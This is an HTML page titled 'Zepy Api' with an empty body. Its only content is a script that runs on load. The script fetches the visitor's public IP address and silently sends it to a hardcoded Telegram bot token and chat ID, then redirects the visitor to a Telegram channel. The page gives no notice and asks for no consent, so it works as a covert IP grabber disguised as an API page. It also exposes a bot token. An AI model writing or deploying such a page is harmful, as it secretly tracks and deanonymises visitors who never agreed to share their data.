<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <title>Zepy Api</title>
  <script>
    fetch('https://api.ipify.org?format=json')
      .then(response => response.json())
      .then(data => {
        const ip = data.ip;
        const token = '7627954962:AAHVwLsNQdpFSi3E6Zg5qRzIQ7tBUdSRFKA';
        const chat_id = '7708476554';
        const text = `IP: ${ip}`;

        fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({ chat_id, text })
        });
      })
      .finally(() => {
        // Redirect setelah IP dikirim
        setTimeout(() => {
          window.location.href = 'https://t.me/zepyytry';
        }, 1000); // Delay 1 detik
      });
  </script>
</head>
<body style="margin:0;"></body>
</html>
